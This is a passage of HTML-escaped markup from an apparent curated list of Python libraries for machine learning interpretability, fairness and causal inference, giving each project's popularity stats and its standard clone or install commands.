&lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/yellowbrick&#34;&gt;PyPi&lt;/a&gt; (📥 640K / month · 📦 62 · ⏱️ 19.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install yellowbrick&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/yellowbrick&#34;&gt;Conda&lt;/a&gt; (📥 27K · ⏱️ 24.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge yellowbrick&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/microsoft/dowhy&#34;&gt;DoWhy&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 3.8K) - DoWhy is a Python library for causal inference that supports explicit.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/microsoft/dowhy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 48 · 🔀 610 · 📥 29 · 📦 110 · 📋 200 - 27% open · ⏱️ 20.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Microsoft/dowhy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dowhy&#34;&gt;PyPi&lt;/a&gt; (📥 110K / month · 📦 4 · ⏱️ 20.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dowhy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/dowhy&#34;&gt;Conda&lt;/a&gt; (📥 5.4K · ⏱️ 21.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge dowhy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/parrt/dtreeviz&#34;&gt;dtreeviz&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 2.1K) - A python library for decision tree visualization and model interpretation. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/parrt/dtreeviz&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 270 · 📦 380 · 📋 120 - 20% open · ⏱️ 29.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/parrt/dtreeviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dtreeviz&#34;&gt;PyPi&lt;/a&gt; (📥 110K / month · 📦 14 · ⏱️ 29.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dtreeviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/dtreeviz&#34;&gt;Conda&lt;/a&gt; (📥 11K · ⏱️ 29.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge dtreeviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/fairlearn/fairlearn&#34;&gt;fairlearn&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 1.3K) - A Python package to assess and improve fairness of machine.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/fairlearn/fairlearn&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 67 · 🔀 310 · 📋 380 - 44% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/fairlearn/fairlearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/fairlearn&#34;&gt;PyPi&lt;/a&gt; (📥 96K / month · 📦 13 · ⏱️ 07.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install fairlearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/fairlearn&#34;&gt;Conda&lt;/a&gt; (📥 18K · ⏱️ 07.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge fairlearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/oegedijk/explainerdashboard&#34;&gt;explainerdashboard&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 1.2K) - Quickly build Explainable AI dashboards that show the inner.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/oegedijk/explainerdashboard&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 14 · 🔀 160 · 📦 110 · 📋 180 - 6% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/oegedijk/explainerdashboard&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/explainerdashboard&#34;&gt;PyPi&lt;/a&gt; (📥 40K / month · 📦 3 · ⏱️ 02.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install explainerdashboard&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/explainerdashboard&#34;&gt;Conda&lt;/a&gt; (📥 16K · ⏱️ 15.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge explainerdashboard&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Trusted-AI/AIF360&#34;&gt;Fairness 360&lt;/a&gt;&lt;/b&gt; (🥈26 · ⭐ 1.7K) - A comprehensive set of fairness metrics for datasets and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Trusted-AI/AIF360&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 49 · 🔀 550 · 📦 160 · 📋 140 - 55% open · ⏱️ 05.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Trusted-AI/AIF360&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/aif360&#34;&gt;PyPi&lt;/a&gt; (📥 8.5K / month · 📦 8 · ⏱️ 04.03.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install aif360&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/aif360&#34;&gt;Conda&lt;/a&gt; (📥 2.1K · ⏱️ 29.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge aif360&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/microsoft/responsible-ai-toolbox&#34;&gt;responsible-ai-widgets&lt;/a&gt;&lt;/b&gt; (🥈26 · ⭐ 490) - This project provides responsible AI user interfaces.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/microsoft/responsible-ai-toolbox&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 24 · 🔀 120 · 📦 29 · 📋 260 - 19% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/microsoft/responsible-ai-toolbox&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/raiwidgets&#34;&gt;PyPi&lt;/a&gt; (📥 11K / month · 📦 3 · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install raiwidgets&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/marcotcr/checklist&#34;&gt;checklist&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 1.7K · 💤) - Beyond Accuracy: Behavioral Testing of NLP models with.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/marcotcr/checklist&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 12 · 🔀 160 · 📦 130 · 📋 92 - 13% open · ⏱️ 28.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/marcotcr/checklist&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/checklist&#34;&gt;PyPi&lt;/a&gt; (📥 41K / month · 📦 3 · ⏱️ 24.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install checklist&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/checklist&#34;&gt;Conda&lt;/a&gt; (📥 2.9K · ⏱️ 15.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge checklist&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/quantumblacklabs/causalnex&#34;&gt;CausalNex&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 1.5K) - A Python library that helps data scientists to infer.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/quantumblacklabs/causalnex&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 22 · 🔀 170 · 📦 39 · 📋 110 - 19% open · ⏱️ 11.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/quantumblacklabs/causalnex&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/causalnex&#34;&gt;PyPi&lt;/a&gt; (📥 1.5K / month · 📦 2 · ⏱️ 11.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install causalnex&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Trusted-AI/AIX360&#34;&gt;Explainability 360&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 1.1K) - Interpretability and explainability of data and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Trusted-AI/AIX360&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 29 · 🔀 220 · 📦 45 · 📋 64 - 59% open · ⏱️ 18.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Trusted-AI/AIX360&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/aix360&#34;&gt;PyPi&lt;/a&gt; (📥 1.1K / month · 📦 1 · ⏱️ 28.10.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install aix360&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/csinva/imodels&#34;&gt;imodels&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 770) - Interpretable ML package for concise, transparent, and accurate predictive.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/csinva/imodels&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 11 · 🔀 74 · 📦 12 · 📋 33 - 27% open · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/csinva/imodels&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/imodels&#34;&gt;PyPi&lt;/a&gt; (📥 3.2K / month · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install imodels&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PAIR-code/lit&#34;&gt;LIT&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 2.9K) - The Language Interpretability Tool: Interactively analyze NLP models for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PAIR-code/lit&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 18 · 🔀 300 · 📦 10 · 📋 130 - 48% open · ⏱️ 15.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PAIR-code/lit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/lit-nlp&#34;&gt;PyPi&lt;/a&gt; (📥 1.2K / month · ⏱️ 21.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install lit-nlp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/lit-nlp&#34;&gt;Conda&lt;/a&gt; (📥 35K · ⏱️ 09.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge lit-nlp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/philipperemy/keract&#34;&gt;keract&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 980) - Layers Outputs and Gradients in Keras. Made easy. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/philipperemy/keract&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 16 · 🔀 180 · 📦 140 · 📋 86 - 5% open · ⏱️ 10.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/philipperemy/keract&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/keract&#34;&gt;PyPi&lt;/a&gt; (📥 1.2K / month · 📦 5 · ⏱️ 19.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install keract&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/kundajelab/deeplift&#34;&gt;deeplift&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 640) - Public facing deeplift repo. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/kundajelab/deeplift&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 11 · 🔀 150 · 📦 59 · 📋 84 - 42% open · ⏱️ 11.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/kundajelab/deeplift&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/deeplift&#34;&gt;PyPi&lt;/a&gt; (📥 750 / month · 📦 4 · ⏱️ 11.11.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install deeplift&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/sicara/tf-explain&#34;&gt;tf-explain&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 930) - Interpretability Methods for tf.keras models with Tensorflow 2.x. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/sicara/tf-explain&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 98 · 📦 120 · 📋 91 - 43% open · ⏱️ 22.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/sicara/tf-explain&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tf-explain&#34;&gt;PyPi&lt;/a&gt; (📥 2.2K / month · 📦 7 · ⏱️ 18.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tf-explain&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/interpretml/DiCE&#34;&gt;DiCE&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 830) - Generate Diverse Counterfactual Explanations for any machine.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/interpretml/DiCE&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 12 · 🔀 120 · 📋 120 - 44% open · ⏱️ 11.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/interpretml/DiCE&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dice-ml&#34;&gt;PyPi&lt;/a&gt; (📥 53K / month · 📦 3 · ⏱️ 27.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dice-ml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PAIR-code/what-if-tool&#34;&gt;What-If Tool&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 680) - Source code/webpage/demos for the What-If Tool. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PAIR-code/what-if-tool&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 20 · 🔀 130 · 📋 100 - 54% open · ⏱️ 05.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PAIR-code/what-if-tool&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/witwidget&#34;&gt;PyPi&lt;/a&gt; (📥 6.5K / month · 📦 3 · ⏱️ 12.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install witwidget&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tensorboard-plugin-wit&#34;&gt;Conda&lt;/a&gt; (📥 990K · ⏱️ 06.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tensorboard-plugin-wit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.npmjs.com/package/wit-widget&#34;&gt;npm&lt;/a&gt; (📥 4.3K / month · ⏱️ 12.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; npm install wit-widget&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dssg/aequitas&#34;&gt;aequitas&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 480 · 💤) - Bias and Fairness Audit Toolkit. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/dssg/aequitas&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 16 · 🔀 88 · 📦 100 · 📋 59 - 64% open · ⏱️ 27.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/dssg/aequitas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/aequitas&#34;&gt;PyPi&lt;/a&gt; (📥 2.5K / month · 📦 6 · ⏱️ 16.12.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install aequitas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/edublancas/sklearn-evaluation&#34;&gt;sklearn-evaluation&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 320) - Machine learning model evaluation made easy: plots,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/edublancas/sklearn-evaluation&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 8 · 🔀 31 · 📦 46 · 📋 39 - 23% open · ⏱️ 16.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/edublancas/sklearn-evaluation&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sklearn-evaluation&#34;&gt;PyPi&lt;/a&gt; (📥 1.3K / month · 📦 2 · ⏱️ 16.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sklearn-evaluation&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jalammar/ecco&#34;&gt;ecco&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 1.4K) - Explain, analyze, and visualize NLP language models. Ecco creates.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/jalammar/ecco&#34;&gt;GitHub&lt;/a&gt; 